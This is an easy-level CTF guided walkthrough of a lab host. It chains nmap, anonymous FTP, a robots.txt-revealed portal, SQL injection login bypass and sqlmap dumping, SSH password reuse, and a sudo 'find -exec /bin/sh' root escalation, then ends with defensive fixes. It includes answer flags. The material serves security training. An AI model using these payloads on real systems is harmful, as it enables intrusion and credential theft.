text: BrewMaster Coffee Co.: The Rushed Portal (Easy)

children.Question:
BrewMaster Coffee Co.: The Rushed Portal

Format: Guided walkthrough · 12 tasks · Difficulty: Easy · Time: 1 hours

Before you start

  1. Start the lab and connect your Kali attacker box.
  2. Your target, the Roastery server, is in 172.16.20.0/24 Lan.

Storyline

BrewMaster Coffee Co. is a small independent coffee roaster in Norfolk, VA. To let baristas check the weekly roast schedule from home, the owner rushed out a staff web portal and set up an FTP file drop - then went back to roasting beans. Nobody hardened anything. You have been hired as a junior penetration tester to find out how far an attacker could get.

Scope

  • In scope: the single target host in 172.16.20.0/24.
  • Out of scope: denial-of-service and any destructive action.

What you will practice

  • Port scanning and service/version detection
  • Enumerating an anonymous FTP service
  • Web content discovery
  • SQL injection - authentication bypass, straight from the browser
  • Credential reuse to gain an SSH foothold
  • Linux privilege escalation via a sudo misconfiguration (GTFOBins)

Flags

There are two flags. Both use the format BrewMaster{...}:

  • user.txt - in the foothold user home directory.
  • root.txt - in /root.

Scoring

11 graded tasks · 150 points total. Hints carry small penalties.

Let's Start !

Every engagement starts by finding out which doors are open. We scan the target for listening TCP ports and ask nmap to identify the software behind each one.

Background

A port scan tells you which network services a host exposes. Version detection then fingerprints each service, which guides everything you do next.

Goal: Discover the open TCP ports on the target.

Tool: nmap - the standard network scanner. The -sV flag adds service/version detection.

Step-by-Step

  1. Run a version scan against the target:
┌──(kali㉿kali)-[~]
└─$ nmap -sV 172.16.20.10

Observed result:

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.5
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.17 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))
Service Info: Host: BrewMaster; OS: Linux

Command notes

  • nmap - network mapper / port scanner.
  • -sV - probe open ports to determine service and version.
  • Tip: add -p- to scan all 65535 ports; here the top-ports scan already finds them.

How many TCP ports are open on the target?

Answer format: a single number, e.g. 2

Hints.text: Run nmap -sV against the target and count the lines that say "open".

children.Question:
Port 80 is open, so a web server is running. Before browsing the site, capture the web server software and version - it is the baseline for any web assessment.

Background

Most web servers reveal themselves in the Server: HTTP response header. Reading it is the quickest fingerprint you can take.

Goal: Read the HTTP Server banner on port 80.

Tool: curl - a command-line HTTP client. Used here to make a HEAD request and read only the response headers.

Step-by-Step

  1. Request only the headers with a HEAD request:
┌──(kali㉿kali)-[~]
└─$ curl -sI http://172.16.20.10/

Observed result (relevant line):

Server: Apache/2.4.52 (Ubuntu)

Command notes

  • -s - silent (hide the progress meter).
  • -I - send a HEAD request; we only want headers.
  • The same version also appears in the nmap -sV output from the previous task.

What is the web server software and version?

Answer format: Software/X.Y.Z (Ubuntu)

Hints.text: Look at the Server: header from curl -sI, or the port 80 line in nmap -sV.

children.Question:
The scan showed FTP on port 21. Many rushed setups leave anonymous FTP enabled, which lets anyone log in without a real account. Let us check.

Background

Anonymous FTP accepts the username anonymous (or ftp) with any password. If enabled, its files are readable by anyone on the network.

Goal: Log in anonymously and list what is shared.

Tool: ftp / curl - either the interactive FTP client or curl can browse an FTP share.

Step-by-Step

  1. List the anonymous share (curl is quickest):
┌──(kali㉿kali)-[~]
└─$ curl -s ftp://172.16.20.10/

Or interactively - log in with username anonymous and a blank password:

┌──(kali㉿kali)-[~]
└─$ ftp 172.16.20.10

Observed result: a single readable file is present:

staff-memo.txt

Command notes

  • In the interactive client, type ls to list and get staff-memo.txt to download.
  • The banner also greets you with "BrewMaster Coffee Co. FTP".

What is the filename available on the anonymous FTP share?

Answer format: name.ext

Hints.text: Log in with the username anonymous and any password, then list the directory.

children.Question:
Download and read the memo. Internal documents often leak exactly the details an attacker needs - usernames, internal paths, and hints about weak spots.

Goal: Read the memo and find the staff member who has server access.

Tool: curl / cat - fetch and print the file.

Step-by-Step

  1. Print the memo:
┌──(kali㉿kali)-[~]
└─$ curl -s ftp://172.16.20.10/staff-memo.txt

Observed result (excerpt):

Barista usernames are first-initial + last name (e.g. "jrivera" for Jordan Rivera).
Jordan (jrivera) also handles maintenance and has access to the server itself.
...the portal login was thrown together in a rush and nobody has checked whether
it handles typed-in input safely yet.

Why this matters

The memo hands us three gifts: a real username (jrivera), the fact that this user can reach the server, and a strong hint that the login page does not safely handle typed-in input (a classic sign of SQL injection).

According to the memo, which username has access to the server?

Answer format: a single username, e.g. bsmith

Hints.text: The memo names the person who handles maintenance and has server access.

children.Question:
The memo mentioned a staff portal. Web servers often hide such pages from the front page but still list them in robots.txt or expose them to directory brute-forcing.

Background

robots.txt tells search engines which paths to avoid - which conveniently points attackers straight at the "hidden" areas.

Goal: Find the hidden staff portal path.

Tool: curl / gobuster - curl reads robots.txt; gobuster brute-forces directory names from a wordlist.

Step-by-Step

  1. Read robots.txt:
┌──(kali㉿kali)-[~]
└─$ curl -s http://172.16.20.10/robots.txt

Observed result:

User-agent: *
Disallow: /portal/
  1. (Optional) Confirm with a directory scan:
┌──(kali㉿kali)-[~]
└─$ gobuster dir -u http://172.16.20.10/ -w /usr/share/wordlists/dirb/common.txt

Command notes

  • gobuster dir - directory brute-force mode.
  • -w - wordlist of names to try.

What hidden path is revealed by robots.txt?

Answer format: /path/

Hints.text: robots.txt has a single Disallow line - that is the path.

children.Question:
Open the portal in a browser at http://172.16.20.10/portal/. You are greeted by a staff login form. The memo warned that its input handling is unsafe - let us identify the exact weakness.

Background

SQL injection (SQLi) happens when a web app builds a database query by gluing your input directly into the SQL text. A single quote ' can break out of the intended string and change what the query does.

Goal: Identify the vulnerability class affecting the login.

Tool: your browser - just type a test character into the field.

Step-by-Step

  1. In the Username field, type a single quote and submit:
Username:  '
Password:  anything

The login misbehaves (it does not simply say "invalid") because your quote is being inserted straight into a SQL statement that looks like:

SELECT id, username, role FROM staff WHERE username='' AND password=''

Because the input is not sanitised, we can rewrite the query logic - the definition of SQL injection.

What type of web vulnerability does the login form suffer from?

Answer format: the vulnerability name, e.g. Cross-Site Scripting

Hints.text: A single quote breaking a login query is the signature of this injection flaw.

children.Question:
Now weaponise the injection. The easiest and most common trick is an authentication bypass: comment out the password check so the query returns a valid user.

Background

In SQL, -- (two dashes and a space) starts a comment. If we close the username string and comment out the rest, the password condition disappears.

Goal: Log in without valid credentials.

Tool: the browser first (simplest), then optionally sqlmap.

Step-by-Step (browser - do this first)

  1. In the Username field type the payload below, put anything in Password, and submit:
Username:  admin' -- -
Password:  x

The query becomes ... WHERE username='admin' -- -' AND password='x'. Everything after -- is ignored, so it matches the admin row and logs you in. You land on the staff dashboard, which lists all staff accounts.

Optional - dump the same data with sqlmap

Tool: sqlmap - automates detection and exploitation of SQLi. Use it only after you understand the manual method:

┌──(kali㉿kali)-[~]
└─$ sqlmap -u "http://172.16.20.10/portal/index.php" --data="username=a&password=a" --batch --dump -T staff

Command notes

  • --data - the POST body; sqlmap injects into these parameters.
  • --dump -T staff - extract the staff table.

After bypassing the login, how many staff accounts are listed on the dashboard?

Answer format: a single number, e.g. 2

Hints.text: Try username  admin' -- -  with any password, then count the rows in the staff table.

children.Question:
You bypassed the login by hand, but the very same injection lets you read the entire database. Because the login returns a clean success/failure response (a redirect when the query matches, an error when it does not), it is a perfect true/false oracle for automated blind extraction. Enumerating the database is the natural next move for a thorough attacker.

Background

When results are not printed on the page, you cannot simply UNION-select data onto the screen. Instead you ask the database yes/no questions and read the answer from the app's behaviour (login vs. error). Doing this by hand is slow, so we let sqlmap automate it.

Goal: Confirm the injection with sqlmap and read the DBMS version.

Tool: sqlmap – automates detection and exploitation of SQL injection.

Step-by-Step

Point sqlmap at the login POST request and target the username field:

┌──(kali㉿kali)-[~]
└─$ sqlmap -u "http://172.16.20.10/portal/index.php" --data="username=admin&password=x" -p username --batch --banner

Observed output (trimmed):

POST parameter 'username' is vulnerable.
Type: boolean-based blind ; time-based blind ; UNION query (3 columns)
back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
back-end DBMS operating system: Linux Ubuntu 22.04 (jammy)
banner: '10.6.23-MariaDB-0ubuntu0.22.04.1'

Command notes

  • --data – the POST body; sqlmap injects into these parameters.
  • -p username – focus testing on the username field.
  • --batch – accept all defaults (non-interactive).
  • --banner – read the DBMS version banner.

Manual check (same oracle): a true condition logs you in (HTTP 302), a false one does not (HTTP 200) – e.g. username=admin' AND @@version LIKE '10.6%'-- - returns 302.

Question: What is the back-end DBMS version reported by sqlmap?

Answer Format: the version string, e.g. X.Y.Z-Name-...

Hints.text: sqlmap --banner prints the exact version; or test @@version LIKE '10.6%' through the login's true/false response.

children.Question:
With the injection confirmed, list the databases the web application's database account can reach.

Goal: Enumerate the databases visible through the injection.

Tool: sqlmap.

Step-by-Step

┌──(kali㉿kali)-[~]
└─$ sqlmap -u "http://172.16.20.10/portal/index.php" --data="username=admin&password=x" -p username --batch --dbs

Observed output (trimmed):

fetching database names
available databases [2]:
[*] brewmaster
[*] information_schema

Two databases are visible to the app's account: brewmaster (the application data) and the always-present information_schema. A limited account like this is normal, but it can still read everything inside brewmaster.

Question: How many databases are accessible to the application's database account?

Answer Format: a single number

Drill into brewmaster: list its tables, then the columns of the table that holds credentials.

Goal: Map the structure of the staff table before dumping it.

Tool: sqlmap.

Step 1 – list the tables

┌──(kali㉿kali)-[~]
└─$ sqlmap -u "http://172.16.20.10/portal/index.php" --data="username=admin&password=x" -p username --batch -D brewmaster --tables

Observed output (trimmed):

Database: brewmaster
[1 table]
+-------+
| staff |
+-------+

Step 2 – list the columns of staff

┌──(kali㉿kali)-[~]
└─$ sqlmap -u "http://172.16.20.10/portal/index.php" --data="username=admin&password=x" -p username --batch -D brewmaster -T staff --columns

Observed output (trimmed):

Database: brewmaster  Table: staff  [4 columns]
| id       | int(11)      |
| username | varchar(50)  |
| password | varchar(100) |
| role     | varchar(50)  |

Four columns. From here, --dump -T staff would extract every account and its clear-text password (the same data the dashboard leaked after the auth bypass) – confirming the impact from a second angle.

Question: How many columns does the staff table have?

Answer Format: a single number

Hints.text: sqlmap -D brewmaster -T staff --columns lists them; count the rows.

children.Question:
The dashboard has a serious flaw of its own: it displays every account's password in clear text (sensitive data exposure). Combined with the memo, this hands us a way onto the server.

Goal: Recover the password for the user with server access (jrivera).

Tool: the dashboard you just reached (or the sqlmap dump).

Step-by-Step

  1. On the dashboard, read the row for jrivera and note the password shown in the Password column.

Observed result:

User      Password         Role
jrivera   *************    Barista (server access)

There is also an "IT note" panel confirming that the portal and server accounts share the same password - a textbook password reuse problem.

What is jrivera's password?

Answer format: the password string, e.g. Word@1234

Hints.text: The dashboard prints every account's password. Read jrivera's row.

children.text: Foothold: SSH and the User Flag
children.Question_Title: Foothold: SSH and the User Flag
children.Question:
The memo said jrivera can reach the server, and the dashboard leaked the password. Because the same password is reused for the system account, we can log straight in over SSH.

Background

Credential reuse - people reuse one password across systems. A password found in a web app frequently unlocks SSH, and vice-versa.

Goal: Get an interactive shell and read the user flag.

Tool: ssh - the secure shell client for remote login.

Step-by-Step

  1. Log in as jrivera (enter the recovered password when prompted):
┌──(kali㉿kali)-[~]
└─$ ssh jrivera@172.16.20.10
  1. Confirm who you are and read the flag:
┌──(kali㉿kali)-[~]
└─$ id
┌──(kali㉿kali)-[~]
└─$ cat user.txt

Observed result:

uid=1001(jrivera) gid=1001(jrivera) groups=1001(jrivera)
BrewMaster{83eced446d97a258af14ff56}

Submit the user flag from jrivera's home directory.

Answer format: BrewMaster{...}

Hints.text: Reuse the portal password: ssh jrivera@172.16.20.10 , then cat user.txt.

children.Question:
You have a foothold, but only as a normal user. The first thing to check for privilege escalation is what commands you are allowed to run as root.

Background

sudo -l lists the commands the current user may run through sudo. A single over-permitted binary is often enough to become root.

Goal: Find what jrivera can run as root without a password.

Tool: sudo - runs commands as another user; -l lists your privileges.

Step-by-Step

  1. List your sudo rights:
┌──(kali㉿kali)-[~]
└─$ sudo -l

Observed result:

User jrivera may run the following commands on BrewMaster:
    (root) NOPASSWD: /usr/bin/find

Which binary can jrivera run as root without a password?

Answer format: full path, e.g. /usr/bin/xxx

Hints.text: Run sudo -l - it prints exactly one NOPASSWD binary.

children.Question:
Being able to run find as root is all we need. find can execute commands with its -exec option - and because sudo runs it as root, that command also runs as root.

Background

GTFOBins is a catalogue of ordinary binaries that can be abused to break out of restricted contexts. The find entry shows the exact sudo escape used below.

Goal: Become root and read the root flag.

Tool: find (via its -exec action).

Step-by-Step

  1. Use find to spawn a root shell:
┌──(kali㉿kali)-[~]
└─$ sudo find . -exec /bin/sh \; -quit
  1. Confirm root and read the flag:
┌──(kali㉿kali)-[~]
└─$ id
┌──(kali㉿kali)-[~]
└─$ cat /root/root.txt

Observed result:

uid=0(root) gid=0(root) groups=0(root)
BrewMaster{826d809e611b249613b1ec33}

Command notes

  • -exec /bin/sh \; - run a shell for the first match.
  • -quit - stop after the first match so you drop straight into the shell.

Submit the root flag from /root/root.txt.

Answer format: BrewMaster{...}

Nicely done - you rooted BrewMaster!

You chained six small mistakes into full compromise. Here is the path and how a defender should close each gap.

Attack chain recap

  1. nmap found FTP, SSH and HTTP.
  2. Anonymous FTP leaked an internal memo (username + hints).
  3. robots.txt exposed the hidden staff portal.
  4. SQL injection bypassed the login and the dashboard leaked plaintext passwords.
  5. A reused password gave an SSH foothold (user flag).
  6. A sudo NOPASSWD entry on find gave root (root flag).

How to fix it (defender view)

  • Disable anonymous FTP; do not store internal notes on public services.
  • Use parameterised queries / prepared statements - never build SQL by string concatenation.
  • Never store or display passwords in plaintext; hash them and remove the dashboard leak.
  • Enforce unique passwords per system; no reuse between web app and SSH.
  • Remove the NOPASSWD sudo rule, or restrict it to a specific safe command.

MITRE ATT&CK touchpoints

  • T1190 Exploit Public-Facing Application (SQL injection)
  • T1078 Valid Accounts (credential reuse over SSH)
  • T1548.003 Abuse Elevation Control Mechanism: Sudo (GTFOBins find)

No answer required - continue to submit your feedback or reset the lab.
